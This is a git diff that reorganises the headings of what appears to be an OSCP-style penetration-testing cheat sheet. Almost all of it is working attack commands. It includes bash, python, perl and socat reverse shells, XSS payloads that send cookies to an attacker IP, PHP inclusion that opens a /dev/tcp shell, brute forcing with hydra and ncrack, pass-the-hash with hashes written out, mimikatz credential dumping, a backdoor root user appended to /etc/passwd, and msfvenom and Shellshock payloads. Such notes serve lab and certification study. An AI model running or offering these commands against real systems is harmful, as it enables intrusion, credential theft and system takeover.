@@ -8,7 +8,7 @@ img: "https://www.offensive-security.com/wp-content/uploads/2016/01/what-is-oscp
 ---
 
 
-# Reverse Shells
+## Reverse Shells
 
 ```bash
 # bash
@@ -27,7 +27,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-## Elevate shell
+### Elevate shell
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -44,8 +44,8 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<host-ip>:4444
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<host-ip>:4444  
 ```
 
-# Web
-## Directory Traversal
+## Web
+### Directory Traversal
 
 ```bash
 dotdotpwn -m http -h <host-ip> -o windows
@@ -54,14 +54,23 @@ dotdotpwn -m http -h <host-ip> -o windows
 dotdotpwn -m stdout -d 8 -o windows > ddp_traversal
 ```
 
-## File Inclusion
+## XSS
+
+```javascript
+'">><script>i=document.createElement("img");i.src='http://10.11.0.61:5555/'+document.cookie;</script>
+
+
+<script>
+new Image().src="http://10.11.0.61:81/bogus.php?output="+document.cookie;
+</script>
+```
+
+### File Inclusion
 
 ```bash
 # check vor DAV upload vulns
 davtest -url <host-ip> -move
 ```
-
-### PUT
 
 Using curl
 
@@ -72,26 +81,25 @@ curl --cookie "JSESSIONID=CFD11DB259AABD57E38AE7ED5935B691" -X PUT http://websit
 -d @- < test.jsp
 ```
 
-
-## PHP Inclusion
+Using PHP
 
 ```bash
 curl -s --data "<?system('ls -la');?>" "http://website/admin.php?ACS_path=php://input%00"
 ```
 
-sometimes only traffic on web port allowed
+Sometimes only traffic on web port allowed
 
 ```bash
 curl -s --data "<? shell_exec('bash -i >& /dev/tcp/10.11.0.61/443 0>&1') ?>" "http://website/admin.php?ACS_path=php://input%00
 ```
 
-read files from system
+Read files from system
 
 ```bash
 https://website/section.php?page=php://filter/convert.base64-encode/resource=/etc/passwd%00
 ```
 
-using kadismus
+Using kadismus
 
 ```bash
 ./kadimus -t https://website/section.php?page=php://input%00 --inject-at page -C '<?php echo "pwned"; ?>' -X input
@@ -108,43 +116,31 @@ using kadismus
 
 ```
 
-
-### File Upload
-
-```bash
-# BSD ftp oneliner to download file to webserver
-<?php system("ftp -4 -d -v -o /usr/local/databases/blah.php ftp://offsec:password@10.11.0.61//php-reverse-shell.php") ?>
-
-# BSD wget alternative
-<?php system("fetch http://10.11.0.61:8000/php-reverse-shell.php -o /tmp/sh.php") ?>
-```
-
-
 ## SQLi
 
 
 ### sqlmap
+
 ```bash
 sqlmap -u "http://website/wp/wp-content/plugins/wp-forum/feed.php?topic=-4381 " --dbms=mysql --technique=U --union-cols=7 --random-agent --dump
 
 sqlmap -u "http://website/edit_period.php?period_id=1 " --cookie="PHPSESSID=h7gtd8seldqt6vfa9igebn4tu1" --dbms=mysql --level=5 --risk=3
 ```
-# Services
+## Service Cracking & Enumeration
 
-## RDP
+RDP
 
 ```bash
 ncrack -vv --user offsec -P password-file.txt rdp://<host-ip>
 ```bash
 
-## ssh
-
+SSH
 
 ```bash
 hydra -l root -P password-file.txt <host-ip> ssh
 ```
 
-## ftp
+FTP
 
 Check wordlist over multiple hosts
 
@@ -152,8 +148,7 @@ Check wordlist over multiple hosts
 hydra -M ftp_hosts_open.txt -l administrator -P /usr/share/john/password.lst ftp
 ```
 
-## SNMP
-
+SNMP
 
 ```bash
 hydra -P password-file.txt -v <host-ip> snmp
@@ -183,7 +178,7 @@ while read -r line;
 done < ip_list.txt
 ```
 
-## DNS
+DNS
 
 ```bash
 #Forward DNS Lookup Brute Force
@@ -202,13 +197,13 @@ done
 dnsrecon -d megacorpone.com -t axfr
 ```
 
-## LDAP
+LDAP
 
 ```bash
 ldapsearch -h <host-ip> -p 389 -w <password> -x -b "dc=<domain>,dc=local
 ```
 
-## ajp
+AJP
 
 ```bash
 nmap -p 8009 <host-ip> --script ajp-brute
@@ -216,13 +211,13 @@ nmap -p 8009 <host-ip> --script ajp-brute
 nmap -p 8009 <host-ip> --script ajp-request --script-args method=GET
 ```
 
-## NetBios
+NetBios
 
 ```bash
 nbtscan <host-ip>
 ```
 
-## SMB
+SMB
 
 ```bash
 smbmap -d <domain> -H <host-ip> -R
@@ -232,7 +227,7 @@ mount -t cifs "//<ip-address>/Share" smbmount
 smbclient "\\\\<ip-address>\Share"
 ```
 
-## rpc
+RPC
 
 
 ```bash
@@ -241,10 +236,9 @@ rpcclient <ip address> -U “” -N
 rpcinfo -p <target ip>
 ```
 
-# Password
-## Cracking
+## Password Cracking
 
-### TightVNC
+TightVNC
 
 ```posh
 C:\Users\ADMINI~1\Desktop\Tools>vncpwd.exe 2151D3722874AD0C
@@ -259,21 +253,22 @@ web:    aluigi.org
   Password:   <password>
 ```
 
-### SAM
+SAM
 
 ```bash
 pwdump system SAM
 ```
 
-## Bruteforce
+## Password Bruteforce
 
-### HTTP
+HTTP
 
 ```bash
 medusa -h <host-ip> -u {jeff,admin} -P mega-mangled -M http -n 80 -m DIR:/xampp -T 3
 ```
 
-### RDP
+RDP
+
 ```bash
 ncrack -vv --user administrator -P ~/PASSWD/mega-mangled rdp://<host-ip>
 ```
@@ -287,9 +282,7 @@ python crowbar.py -b rdp -s <host-ip>/32 -U ~/targets/0_usernames -C ~/targets/0
 
 ### Windows
 
-#### Files containing passwords
-
-Files
+Files containing passwords
 
 ```posh
 # has to be decrypted with gpp-decrypt
@@ -306,20 +299,10 @@ reg query HKLM\Software\TightVNC\Server
 ```
 
 
-# XSS
 
-```javascript
-'">><script>i=document.createElement("img");i.src='http://10.11.0.61:5555/'+document.cookie;</script>
+## Msfvenom Payloads
 
-
-<script>
-new Image().src="http://10.11.0.61:81/bogus.php?output="+document.cookie;
-</script>
-```
-
-# msfvenom
-
-## Windows
+### Windows
 
 ```bash
 
@@ -339,8 +322,8 @@ msfvenom -p windows/shell_reverse_tcp LPORT=6666 LHOST=10.11.0.61 -e x86/shikata
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.61 LPORT=444 -f js_le -e generic/none
 ```
 
-# Remote Exploits
-## Shellshock
+## Remote Exploits
+### Shellshock
 
 ```bash
 python 34900.py payload=reverse pages=/cgi-bin/admin.cgi rhost=<host-ip> lhost=10.11.0.61 lport=555
@@ -357,29 +340,12 @@ manually
 ```bash
 python shocker.py --Host <host-ip>
 ```
-## James SMTP
 
-```bash
-python james_smtp_2.3.2.py <server-ip>
-
-[+]Connecting to James Remote Administration Tool...
-[+]Creating user...
-[+]Connecting to James SMTP server...
-[+]Sending payload...
-[+]Done! Payload will be executed once somebody logs in
-```
-
-## XXE
-
-```bash
-python sym11_12_expl.py -t 127.0.0.1 -c "net user <user> <password> /add
-```
+## Local Privilege Escalation
+### Windows
 
 
-# LPE
-## Windows
-### Hash Injection
-
+Hash Injection
 
 ```bash
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:175a592f3b0c0c5f02fad40c51412d3a //<host-ip> cmd.exe
@@ -389,7 +355,7 @@ mimikatz # sekurlsa::pth /user:Administrateur /domain:<domain> /ntlm:cc36cf7a851
 xfreerdp /u:Administrator /pth:aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 /v:<host-ip> -O
 ```
 
-### User and Domains
+User and Domains
 
 ```bash
 net view /DOMAIN:WORKGROUP
@@ -397,18 +363,16 @@ net group "Domain Admins"
 net localgroup "Administrators"
 ```
 
-
-#### add admin user
+Add admin user
 
 ```bash
 net user /add low <password>
 net localgroup administrators low /add
 ```
 
+Insecure Files and Services
 
-### Insecure Files and Services
-
-``` {.c breaklines=true bgcolor=bg fontsize=\footnotesize}
+```c
 #include <stdlib.h> /* system, NULL, EXIT_FAILURE */
 int main ()
 {
@@ -422,7 +386,7 @@ int main ()
 ```
 
 
-```bash
+```posh
 # show user rights for file 
 icacls scsiaccess.exe
 
@@ -447,6 +411,15 @@ dir /s *pass* == *cred* == *vnc* == *.config*
 net use \\<ip-address>\$Share “” /u:””
 ```
 
+#### Registry
+
+```posh
+reg query HKLM\SYSTEM\CurrentControlSet\Services
+
+# grep registry for passwords
+reg query HKCU /f password /t REG_SZ /s
+reg query HKLM /f password /t REG_SZ /s
+```
 
 #### sc
 
@@ -458,15 +431,7 @@ sc config "Spooler" binpath= "net user <username> <password> /add"
 net start upnphost
 ```
 
-#### Registry
 
-```posh
-reg query HKLM\SYSTEM\CurrentControlSet\Services
-
-# grep registry for passwords
-reg query HKCU /f password /t REG_SZ /s
-reg query HKLM /f password /t REG_SZ /s
-```
 
 
 
@@ -491,8 +456,8 @@ tasklist
 
 ## Linux
 
-### Users
 
+Users
 
 Bash script for adding user with admin rights
 
@@ -512,8 +477,7 @@ echo "agentcooper:x:0:0:::/bin/bash" >> /etc/passwd
 echo "agentcooper:x:0:" >> /etc/group
 ```
 
-
-### Insecure files and Services
+Insecure files and Services
 
 Find writable directories
 
@@ -527,8 +491,8 @@ See ports with services
 netstat -tulpn`
 ```
 
-# Access
-## File Transfer
+## Access
+### File Transfer
 
 Create VBS based wget tool for windows 
 
@@ -561,9 +525,10 @@ echo ts.Close >> wget.vbs
 ```
 
 
-## Linux
-### ssh
+### Linux
 
+
+SSH
 
 Port Forwarding via Socks Proxy
 
@@ -578,23 +543,21 @@ curl --socks5 localhost:8888 http://<host-ip>
 proxychains nmap -sT -Pn --top-ports=20 <host-ip>
 ```
 
-### RDP
+RDP
 
 ```bash
 xfreerdp /u:<user> /d:WORKGROUP /p:<password> /v:<host-ip>
 ```
 
-### psexec
+psexec
 
 ```bash
 winexe -U <user>%<password> //<host-ip> cmd.ex
 ```
 
-## Windows
+### Windows
 
-
-
-### plink
+plink
 
 Forward ports to attacker machine:
 
@@ -602,8 +565,7 @@ Forward ports to attacker machine:
 plink.exe -l root <host-ip> -R 8443:127.0.0.1:8443 -R 8014:127.0.0.1:8014 -R 9090:127.0.0.1:9090
 ```
 
-### nc ncat netcat
-
+nc ncat netcat
 
 ```bash
 # start encrypted bind shell on port 444
@@ -614,39 +576,37 @@ ncat -v <host-ip> 4444 --ss
 ```
 
 
-# Tools
+## Tools
 
-## mimikatz
+mimikatz
 
 ```posh
 #dump all passwords
 sekurlsa::logonPasswords full
 ```
 
-
-## openssl
+openssl
 
 ```bash
 # creating MD5 linux hash
 openssl passwd -1 -salt AbCD4536 <password>
 ```
 
-
-## psexec
+psexec
 
 ```posh
 # create remote cmd shell on another host
 psexec \\<host-ip> -u <domain\\user> -p <password> cmd
 ```
 
-## Powershell
+Powershell
 
 ```posh
 # Invoke Powershell script without changing cmd context
 powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
 ```
 
-## nmap
+nmap
 
 ```bash
 nmap -sT --script whois-ip,ssh-hostkey,banner,dns-zone-transfer,ftp-bounce,ftp-syst,ftp-anon
@@ -667,7 +627,7 @@ nmap -Pn -p- -sU -vv <ip address>
 nmap -Pn -sV -O -pT:{TCP ports},U:{UDP ports} -script *vuln* <ip address>
 ```
 
-## compiling
+Compiling
 
 ```bash
 # create shared library
@@ -676,20 +636,20 @@ gcc overwrite_puts.c -o overw_puts -shared -fPIC
 # crosscompiling from linux to exe for 32-bit
 i686-w64-mingw32-gcc 646.c -lws2_32 -o 646.exe
 
-## grep
+Grep
 
 # grep for IP addresses
 grep -oE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"
 ```
 
-## tcpdump
+Tcpdump
 
 ```bash
 # using -X to output raw traffic
 tcpdump -nX -r password_cracking_filtered.pcap | grep -A10 GET
 ```
 
-### filter
+### Tcpdump-Filter
 
 ```bash
 # extract IP addresses from pcap
@@ -712,7 +672,8 @@ tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
 
 
 ```
-##iptables
+
+### iptables
 
 
 ```bash
